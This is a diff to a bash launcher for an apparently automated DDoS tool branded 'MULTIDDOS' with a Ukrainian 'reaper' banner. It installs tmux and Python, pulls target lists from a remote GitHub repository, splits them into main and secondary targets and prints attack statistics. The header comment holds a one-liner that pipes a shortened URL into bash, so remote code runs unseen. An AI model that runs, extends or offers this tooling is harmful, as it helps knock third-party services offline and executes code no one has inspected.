@@ -1,11 +1,12 @@
 #!/bin/bash
 # curl -L tiny.one/multiddos | bash && tmux a
 
+clear
 echo -e "Loading...\n"
 
-sudo apt-get update -qq -y >/dev/null 2>&1 && sudo apt-get install -qq -y toilet
+sudo apt-get update -q -y #>/dev/null 2>&1
 # sudo apt install docker.io gcc libc-dev libffi-dev libssl-dev python3-dev rustc -qq -y 
-sudo apt-get install -qq -y tmux python3 python3-pip
+sudo apt-get install -q -y tmux toilet python3 python3-pip 
 pip install --upgrade pip >/dev/null 2>&1
 
 cd ~
@@ -53,10 +54,10 @@ echo "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/run
 done
 
 # put every line except last line in file $sec_targets
-head -n -1 $all_targets > $sec_targets
+head -n -2 $all_targets > $sec_targets
 
 # put only last line in file $main_targets
-tail -n 1 $all_targets > $main_targets
+tail -n 2 $all_targets > $main_targets
 
 # put all addresses found in $sec_targets in a file on a new line
 for i in $(cat $sec_targets); do
@@ -78,9 +79,9 @@ cat $main_targets_tmp | sort | uniq > $main_targets
 
 # Print greetings and number of targets (secondary, main, total)
 clear
-toilet -t --metal Український
-toilet -t --metal "   жнець"
-toilet -t --metal " MULTIDDOS"
+toilet -t --metal "Український" && sleep 0.1
+toilet -t --metal "   жнець" && sleep 0.1
+toilet -t --metal " MULTIDDOS" && sleep 0.1
 
 typing_on_screen 'Шукаю завдання...'
 
@@ -92,7 +93,7 @@ echo -e "Total:            " "\x1b[32m $(expr $(cat $sec_targets | sort | uniq |
 
 echo -e "\nКількість потоків:" "\x1b[32m $(echo $threads | cut -d " " -f2)\x1b[m" && sleep 0.1
 echo -e "\nЗавантаження..."
-sleep 5
+sleep 8
 }
 export -f prepare_targets_and_banner
 
